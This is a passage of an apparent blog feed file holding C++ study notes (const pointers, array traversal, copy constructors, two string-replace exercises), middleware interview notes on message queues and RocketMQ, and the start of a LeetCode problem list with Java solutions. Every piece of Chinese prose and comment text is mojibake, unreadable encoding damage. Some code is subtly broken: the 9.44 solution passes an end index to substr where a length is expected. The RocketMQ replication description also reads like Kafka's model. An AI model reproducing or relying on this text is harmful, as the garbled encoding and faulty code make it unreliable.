è¡¨ç¤ºæ‰€æŒ‡çš„å¯¹è±¡æ˜¯ä¸ªå¸¸é‡</li></ul><p><font color="orange">æŒ‡é’ˆæŒ‡å‘å¯¹è±¡ï¼ŒæŒ‡é’ˆåœ¨é¡¶å±‚ï¼Œå¯¹è±¡åœ¨åº•å±‚ã€‚</font></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> v1=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> *p1=&amp;v1;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> *p2=p1; <span class="comment">//å¯¹ï¼Œå› ä¸ºint*å¯ä»¥è½¬åŒ–ä¸ºconst int*</span></span><br><span class="line">p1=p2;            <span class="comment">//ä¸å¯¹ï¼Œå› ä¸ºp2æ˜¯åº•å±‚constï¼Œp1ä¸æ˜¯ã€‚</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“æ‰§è¡Œå¯¹è±¡æ‹·è´æ—¶ï¼Œæ‹·å…¥æ‹·å‡ºçš„å¯¹è±¡å¿…é¡»å…·æœ‰ç›¸åŒçš„åº•å±‚constèµ„æ ¼ã€‚æˆ–è€…ä¸¤ä¸ªå¯¹è±¡æ•°æ®ç±»å‹å¿…é¡»å¯ä»¥è½¬æ¢ã€‚<font color="red">éå¸¸é‡å¯ä»¥è½¬æ¢æˆå¸¸é‡ï¼Œåä¹‹ä¸è¡Œ</font></p><p>åº•å±‚æŒ‡é’ˆçš„æ‹·å…¥ä¸»è¦çœ‹æ˜¯å¦åŒä¸ºåº•å±‚çš„æˆ–è€…æ˜¯éå¸¸é‡ã€‚</p><p>å¸¸é‡æŒ‡é’ˆçš„æ‹·å…¥åªèƒ½æ‹·å…¥å¸¸é‡ã€‚</p><p>é¡¶å±‚æŒ‡é’ˆå› ä¸ºåªèƒ½åˆå§‹åŒ–ä¸€æ¬¡åä¸èƒ½æ”¹å˜æ‰€ä»¥ä¸åšè®¨è®ºã€‚</p><h2><span id="constexpr">constexpr</span></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> *p=<span class="literal">nullptr</span>; <span class="comment">//åº•å±‚const</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> *q=<span class="literal">nullptr</span>;<span class="comment">//é¡¶å±‚const ç›¸å¯¹äº*const</span></span><br></pre></td></tr></table></figure><h2><span id="æ•°ç»„">æ•°ç»„</span></h2><h3><span id="å¼•ç”¨éå†æ³•">å¼•ç”¨éå†æ³•ï¼š</span></h3><p>è¦ä½¿ç”¨èŒƒå›´forè¯­å¥å¤„ç†å¤šç»´æ•°ç»„ï¼Œé™¤äº†æœ€å†…å±‚çš„å¾ªç¯å¤–ï¼Œå…¶ä»–æ‰€æœ‰å¾ªç¯çš„æ§åˆ¶å˜é‡éƒ½åº”è¯¥æ˜¯å¼•ç”¨ç±»å‹ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[row][col];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> &amp;row:ia)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i:row)&#123;</span><br><span class="line">        cout &lt;&lt; i;  <span class="comment">//iåªè¯»ï¼Œæ”¹å˜å¯¹æ•°ç»„æ²¡æœ‰å½±å“ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æƒ³è¦å»æ›´æ”¹æ•°ç»„é‡Œé¢çš„å€¼å°±è¦ä½¿ç”¨å¼•ç”¨ç±»å‹å»éå†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> &amp;row:ia)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;col:row)&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="ä¸‹æ ‡éå†æ³•">ä¸‹æ ‡éå†æ³•ï¼š</span></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[row][col];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i=<span class="number">0</span>;i!=row;++i)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> j=<span class="number">0</span>;j!=col;++j)&#123;</span><br><span class="line">        ia[i][j]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>,*p=&amp;i;</span><br><span class="line">*p=<span class="number">2</span>;<span class="comment">//*pæ˜¯içš„ä¸€ä¸ªå¼•ç”¨ï¼Œç›¸å¯¹äº&amp;j=i;</span></span><br></pre></td></tr></table></figure><h3><span id="æŒ‡é’ˆéå†æ³•">æŒ‡é’ˆéå†æ³•ï¼š</span></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> p=ia;p!=ia+<span class="number">3</span>;++p)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> q=*p;q!=*p+<span class="number">4</span>;++q)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­pä¸­å­˜æ”¾åœ°å€æ˜¯ia[x]çš„åœ°å€è€Œä¸”ia[x]å’Œia[x+1]çš„åœ°å€æ˜¯è¿ç»­çš„ï¼Œè€Œ*pæ˜¯å–ia[x][0]çš„åœ°å€ã€‚</p><h2><span id="å·¦å€¼å’Œå³å€¼">å·¦å€¼å’Œå³å€¼</span></h2><h2><span id="æ‹·è´æ„é€ å‡½æ•°">æ‹·è´æ„é€ å‡½æ•°</span></h2><p>å¦‚æœä¸€ä¸ªæ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è‡ªèº«ç±»ç±»å‹çš„å¼•ç”¨ï¼Œä¸”ä»»ä½•é¢å¤–å‚æ•°éƒ½æœ‰é»˜è®¤å€¼ï¼Œåˆ™æ­¤æ„é€ å‡½æ•°æ˜¯æ‹·è´æ„é€ å‡½æ•°ã€‚å½“ä½¿ç”¨<strong>æ‹·è´åˆå§‹åŒ–</strong>æ—¶ï¼Œæˆ‘ä»¬ä¼šç”¨åˆ°æ‹·è´æ„é€ å‡½æ•°ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Foo</span>(); <span class="comment">//é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">Foo</span>(<span class="type">const</span> Foo&amp;);<span class="comment">//æ‹·è´æ„é€ å‡½æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ‹·è´å‡½æ•°é€šå¸¸ä¸åº”è¯¥æ˜¯explicitçš„</strong></p><h2><span id="æ‹·è´åˆå§‹åŒ–">æ‹·è´åˆå§‹åŒ–</span></h2><ul><li><p>ç”¨&#x3D;å®šä¹‰å˜é‡</p></li><li><p>å°†ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå®å‚ä¼ é€’ç»™ä¸€ä¸ªéå¼•ç”¨ç±»å‹çš„å½¢å‚</p></li><li><p>ä»èŠ±æ‹¬å·åˆ—è¡¨åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„ä¸­çš„å…ƒç´ æˆ–ä¸€ä¸ªèšåˆç±»ä¸­çš„æˆå‘˜</p></li></ul><h2><span id="é‡è½½æ‹·è´èµ‹å€¼è¿ç®—ç¬¦">é‡è½½æ‹·è´èµ‹å€¼è¿ç®—ç¬¦</span></h2><p>å¦‚æœä¸€ä¸ªç±»æœªå®šä¹‰è‡ªå·±çš„æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¼–è¯‘å™¨ä¼šä¸ºå®ƒç”Ÿæˆä¸€ä¸ªåˆæˆæ‹·è´èµ‹å€¼è¿ç®—ç¬¦</p><p>å¦‚æœä¸€ä¸ªè¿ç®—ç¬¦æ˜¯ä¸€ä¸ªæˆå‘˜å‡½æ•°ï¼Œå…¶å·¦ä¾§è¿ç®—å¯¹è±¡å°±ç»‘å®šåˆ°éšå¼çš„thiså‚æ•°ã€‚èµ‹å€¼è¿ç®—ç¬¦é€šå¸¸è¿”å›ä¸€ä¸ªæŒ‡å‘å…¶å·¦ä¾§è¿ç®—å¯¹è±¡çš„å¼•ç”¨ã€‚</p><h1><span id="ç»ƒä¹ ">ç»ƒä¹ </span></h1><h2><span id="943">9.43</span></h2><p>å¦‚æœä½¿ç”¨!&#x3D;æ¥æ¯”è¾ƒä¸¤ä¸ªè¿­ä»£å™¨åœ¨è¿™é¢˜æ˜¯ä¸è¡Œçš„ï¼Œä½†æ˜¯å¦‚æœä¸æ˜¯ç‰¹æ®Šæ¡ä»¶æœ€å¥½å†™æˆï¼&#x3D;çš„åˆ¤æ–­æ¡ä»¶ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">replace</span><span class="params">(string&amp; s, <span class="type">const</span> string&amp; oldVal, <span class="type">const</span> string&amp; newVal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> curr = s.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (curr &lt;= s.<span class="built_in">end</span>() - oldVal.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (oldVal == s.<span class="built_in">substr</span>(curr-<span class="built_in">begin</span>(s),  oldVal.<span class="built_in">size</span>()))</span><br><span class="line">&#123;</span><br><span class="line">curr = s.<span class="built_in">erase</span>(curr, curr + oldVal.<span class="built_in">size</span>());</span><br><span class="line">curr = s.<span class="built_in">insert</span>(curr, newVal.<span class="built_in">begin</span>(), newVal.<span class="built_in">end</span>());</span><br><span class="line">curr += newVal.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">++curr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;tho &quot;</span>;</span><br><span class="line">    string oldVal = <span class="string">&quot;tho&quot;</span>;</span><br><span class="line">    string newVal = <span class="string">&quot;though&quot;</span>;</span><br><span class="line"><span class="built_in">replace</span>(s, oldVal, newVal);</span><br><span class="line">    cout &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="944">9.44</span></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">replace</span><span class="params">(string&amp; s, <span class="type">const</span> string&amp; o, <span class="type">const</span> string&amp; n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i+o.<span class="built_in">size</span>() &lt;= s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == s.<span class="built_in">substr</span>(i,i+o.<span class="built_in">size</span>())) &#123;</span><br><span class="line">            s.<span class="built_in">replace</span>(i, o.<span class="built_in">size</span>(), n);</span><br><span class="line">            i += n.<span class="built_in">size</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;tho &quot;</span>;</span><br><span class="line">    string oldVal = <span class="string">&quot;tho&quot;</span>;</span><br><span class="line">    string newVal = <span class="string">&quot;though&quot;</span>;</span><br><span class="line"><span class="built_in">replace</span>(s, oldVal, newVal);</span><br><span class="line">    cout &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸­é—´ä»¶</title>
      <link href="/2020/04/16/middleWare/"/>
      <url>/2020/04/16/middleWare/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>é€‚ç”¨äºé¢è¯•å›ç­”</p><span id="more"></span><!-- toc --><ul><li><a href="#redis">Redis</a></li><li><a href="#mq">MQ</a><ul><li><a href="#%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E4%BC%98%E7%BC%BA%E7%82%B9">æ¶ˆæ¯é˜Ÿåˆ—ä¼˜ç¼ºç‚¹</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8rocketmq">ä¸ºä»€ä¹ˆç”¨RocketMQ</a></li><li><a href="#rocketmq%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7">RocketMQå¦‚ä½•ä¿è¯é«˜å¯ç”¨æ€§</a></li><li><a href="#rocketmq%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%B8%8D%E8%A2%AB%E9%87%8D%E5%A4%8D%E6%B6%88%E8%B4%B9">RocketMQå¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸è¢«é‡å¤æ¶ˆè´¹</a></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E5%8F%AF%E9%9D%A0%E6%80%A7">å¦‚ä½•ä¿è¯æ¶ˆæ¯å¯é æ€§</a></li></ul></li></ul><!-- tocstop --><h1><span id="redis">Redis</span></h1><h1><span id="mq">MQ</span></h1><h2><span id="æ¶ˆæ¯é˜Ÿåˆ—ä¼˜ç¼ºç‚¹">æ¶ˆæ¯é˜Ÿåˆ—ä¼˜ç¼ºç‚¹</span></h2><p><strong>ä¼˜ç‚¹</strong></p><p>â€‹è§£è€¦ã€å‰Šå³°å’Œå¼‚æ­¥</p><p><strong>ç¼ºç‚¹</strong></p><p>â€‹æå‡äº†ç³»ç»Ÿçš„å¤æ‚åº¦ã€ç³»ç»Ÿå¯ç”¨æ€§é™ä½ä»¥åŠå­˜åœ¨ä¸€è‡´æ€§çš„é—®é¢˜ã€‚</p><h2><span id="ä¸ºä»€ä¹ˆç”¨rocketmq">ä¸ºä»€ä¹ˆç”¨RocketMQ</span></h2><ul><li>ååé‡ï¼šActiveMQå’ŒRabbitMQæ˜¯ä¸‡çº§ï¼Œè€ŒRocketMQå’ŒKafkaæ˜¯åä¸‡çº§ã€‚</li><li>Topicï¼š RocketMQå¯ä»¥æ”¯æŒæˆç™¾ä¸Šåƒï¼Œè€ŒKafkaå‡ åå‡ ç™¾ååé‡å¤§å¹…ä¸‹é™</li><li>æ—¶æ•ˆæ€§ï¼š é™¤äº†Rabbitéƒ½æ˜¯msçº§åˆ«</li><li>å¯ç”¨æ€§ï¼šRocketMQå’ŒKafkaéƒ½éå¸¸é«˜</li><li>å¯é æ€§ï¼šRockMQå’ŒKafkaå¯ä»¥åšåˆ°ä¸ä¸¢</li></ul><h2><span id="rocketmqå¦‚ä½•ä¿è¯é«˜å¯ç”¨æ€§">RocketMQå¦‚ä½•ä¿è¯é«˜å¯ç”¨æ€§</span></h2><p>ä¸€ä¸ªæœ€åŸºæœ¬çš„æ¶æ„è®¤è¯†ï¼šç”±å¤šä¸ª broker ç»„æˆï¼Œæ¯ä¸ª broker æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ï¼›ä½ åˆ›å»ºä¸€ä¸ª topicï¼Œè¿™ä¸ª topic å¯ä»¥åˆ’åˆ†ä¸ºå¤šä¸ª partitionï¼Œæ¯ä¸ª partition å¯ä»¥å­˜åœ¨äºä¸åŒçš„ broker ä¸Šï¼Œæ¯ä¸ª partition å°±æ”¾ä¸€éƒ¨åˆ†æ•°æ®ã€‚</p><p>å‰¯æœ¬æœºåˆ¶ï¼Œæ¯ä¸ª partition çš„æ•°æ®éƒ½ä¼šåŒæ­¥åˆ°å…¶å®ƒæœºå™¨ä¸Šï¼Œå½¢æˆè‡ªå·±çš„å¤šä¸ª replica å‰¯æœ¬ã€‚æ‰€æœ‰å‰¯æœ¬ä¼šé€‰å–ä¸€ä¸ªleaderç”¨æ¥è¯»å†™æ•°æ®ã€‚å¦‚æœleader downäº†ï¼Œå°±é‡æ–°é€‰æ‹©leaderã€‚</p><p><strong>å†™æ•°æ®</strong>çš„æ—¶å€™ï¼Œç”Ÿäº§è€…å°±å†™ leaderï¼Œç„¶å leader å°†æ•°æ®è½åœ°å†™æœ¬åœ°ç£ç›˜ï¼Œæ¥ç€å…¶ä»– follower è‡ªå·±ä¸»åŠ¨ä» leader æ¥ pull æ•°æ®ã€‚ä¸€æ—¦æ‰€æœ‰ follower åŒæ­¥å¥½æ•°æ®äº†ï¼Œå°±ä¼šå‘é€ ack ç»™ leaderï¼Œleader æ”¶åˆ°æ‰€æœ‰ follower çš„ ack ä¹‹åï¼Œå°±ä¼šè¿”å›å†™æˆåŠŸçš„æ¶ˆæ¯ç»™ç”Ÿäº§è€…ã€‚</p><h2><span id="rocketmqå¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸è¢«é‡å¤æ¶ˆè´¹">RocketMQå¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸è¢«é‡å¤æ¶ˆè´¹</span></h2><p>æ¯ä¸ªæ¶ˆæ¯å†™è¿›å»ï¼Œéƒ½æœ‰ä¸€ä¸ª offsetï¼Œä»£è¡¨æ¶ˆæ¯çš„åºå·ï¼Œç„¶å æ¶ˆè´¹è€…æ¶ˆè´¹äº†æ•°æ®ä¹‹åï¼Œ<strong>æ¯éš”ä¸€æ®µæ—¶é—´</strong>å°±ä¼šæäº¤ offset ã€‚</p><p>å¦‚æœé‡å¯æ€ä¹ˆåŠï¼Ÿ</p><ul><li>æ¯”å¦‚ä½ æ‹¿ä¸ªæ•°æ®è¦å†™åº“ï¼Œä½ å…ˆæ ¹æ®ä¸»é”®æŸ¥ä¸€ä¸‹ï¼Œå¦‚æœè¿™æ•°æ®éƒ½æœ‰äº†ï¼Œä½ å°±åˆ«æ’å…¥äº†ï¼Œupdate ä¸€ä¸‹å¥½å§ã€‚</li><li>æ¯”å¦‚ä½ æ˜¯å†™ Redisï¼Œé‚£æ²¡é—®é¢˜äº†ï¼Œåæ­£æ¯æ¬¡éƒ½æ˜¯ setï¼Œå¤©ç„¶å¹‚ç­‰æ€§ã€‚</li><li>æ¯”å¦‚ä½ ä¸æ˜¯ä¸Šé¢ä¸¤ä¸ªåœºæ™¯ï¼Œé‚£åšçš„ç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œä½ éœ€è¦è®©ç”Ÿäº§è€…å‘é€æ¯æ¡æ•°æ®çš„æ—¶å€™ï¼Œé‡Œé¢åŠ ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„ idï¼Œæ¶ˆè´¹åˆ°äº†ä¹‹åï¼Œå…ˆæ ¹æ®è¿™ä¸ª id å»æ¯”å¦‚ Redis é‡ŒæŸ¥ä¸€ä¸‹ï¼Œä¹‹å‰æ¶ˆè´¹è¿‡å—ï¼Ÿå¦‚æœæ²¡æœ‰æ¶ˆè´¹è¿‡ï¼Œä½ å°±å¤„ç†ï¼Œç„¶åè¿™ä¸ª id å†™ Redisã€‚å¦‚æœæ¶ˆè´¹è¿‡äº†ï¼Œé‚£ä½ å°±åˆ«å¤„ç†äº†ï¼Œä¿è¯åˆ«é‡å¤å¤„ç†ç›¸åŒçš„æ¶ˆæ¯å³å¯ã€‚</li><li>æ¯”å¦‚åŸºäºæ•°æ®åº“çš„å”¯ä¸€é”®æ¥ä¿è¯é‡å¤æ•°æ®ä¸ä¼šé‡å¤æ’å…¥å¤šæ¡ã€‚å› ä¸ºæœ‰å”¯ä¸€é”®çº¦æŸäº†ï¼Œé‡å¤æ•°æ®æ’å…¥åªä¼šæŠ¥é”™ï¼Œä¸ä¼šå¯¼è‡´æ•°æ®åº“ä¸­å‡ºç°è„æ•°æ®ã€‚</li></ul><h2><span id="å¦‚ä½•ä¿è¯æ¶ˆæ¯å¯é æ€§">å¦‚ä½•ä¿è¯æ¶ˆæ¯å¯é æ€§</span></h2>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¸­é—´ä»¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCodeé«˜é¢‘è€ƒç‚¹</title>
      <link href="/2020/04/16/Hi-Freq/"/>
      <url>/2020/04/16/Hi-Freq/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†é«˜é¢‘çš„é¢è¯•é¢˜</p><span id="more"></span><!-- toc --><ul><li><a href="#%E6%95%B0%E7%BB%84">æ•°ç»„</a><ul><li><a href="#two-sum">Two Sum âˆš</a></li><li><a href="#maximum-swap">Maximum Swap âˆš</a></li><li><a href="#median-of-two-sorted-arrays">Median of Two Sorted Arrays</a></li><li><a href="#swap-adjacent-in-lr-string">Swap Adjacent in LR String</a></li></ul></li><li><a href="#%E9%93%BE%E8%A1%A8">é“¾è¡¨</a><ul><li><a href="#merge-k-sorted-lists-">Merge k Sorted Lists -</a></li><li><a href="#lru-">LRU -</a></li><li><a href="#reverse-nodes-in-k-group-">Reverse Nodes in K-group -</a></li><li><a href="#copy-list-with-random-pointer-">Copy List with Random Pointer -</a></li><li><a href="#merge-two-sorted-lists">Merge Two Sorted Lists âˆš</a></li><li><a href="#add-two-numbers">Add Two Numbers âˆš</a></li><li><a href="#add-two-numbers-ii">Add Two Numbers II âˆš</a></li><li><a href="#reverse-words-in-a-string-">Reverse Words in a String -</a></li><li><a href="#merge-k-sorted-lists--1">Merge k Sorted Lists -</a></li></ul></li><li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92">åŠ¨æ€è§„åˆ’</a><ul><li><a href="#climbing-stairs">Climbing Stairs âˆš</a></li></ul></li><li><a href="#%E6%A0%88">æ ˆ</a><ul><li><a href="#trapping-rain-water">Trapping Rain Water</a></li><li><a href="#simplify-path">Simplify Path</a></li></ul></li><li><a href="#%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE">äºŒåˆ†æŸ¥æ‰¾</a><ul><li><a href="#search-in-rotated-sorted-array">Search in Rotated Sorted Array âˆš</a></li></ul></li><li><a href="#%E5%8F%8C%E6%8C%87%E9%92%88">åŒæŒ‡é’ˆ</a><ul><li><a href="#longest-substring-without-repeating-characters">Longest Substring Without Repeating Characters âˆš</a></li></ul></li><li><a href="#%E6%90%9C%E7%B4%A2">æœç´¢</a><ul><li><a href="#longest-palindromic-substring">Longest Palindromic Substring Ã—</a></li></ul></li><li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-1">åŠ¨æ€è§„åˆ’</a><ul><li><a href="#maximum-subarray">Maximum Subarray âˆš</a></li><li><a href="#regular-expression-matching">Regular Expression Matching âˆš</a></li></ul></li><li><a href="#%E6%8E%92%E5%BA%8F">æ’åº</a><ul><li><a href="#kth-largest-element-in-an-array">Kth Largest Element in an Array âˆš</a></li></ul></li><li><a href="#%E6%95%B0%E5%AD%97">æ•°å­—</a><ul><li><a href="#reverse-integer">Reverse Integer âˆš</a></li><li><a href="#implement-rand10-using-rand7">Implement Rand10() Using Rand7()</a></li></ul></li></ul><!-- tocstop --><h1><span id="æ•°ç»„">æ•°ç»„</span></h1><h2><span id="two-sum">Two Sum âˆš</span></h2><p>Given an array of integers, return <strong>indices</strong> of the two numbers such that they add up to a specific target.</p><p>You may assume that each input would have *<strong>exactly*</strong> one solution, and you may not use the <em>same</em> element twice.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [2, 7, 11, 15], target = 9,</span><br><span class="line"></span><br><span class="line">Because nums[0] + nums[1] = 2 + 7 = 9,</span><br><span class="line">return [0, 1].</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> res[] =<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        HashMap&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(nums[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;map.get(nums[i]),i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> map.put(target-nums[i],i);</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="maximum-swap">Maximum Swap âˆš</span></h2><p>Given a non-negative integer, you could swap two digits <strong>at most</strong> once to get the maximum valued number. Return the maximum valued number you could get.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2736</span><br><span class="line">Output: 7236</span><br><span class="line">Explanation: Swap the number 2 and the number 7.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 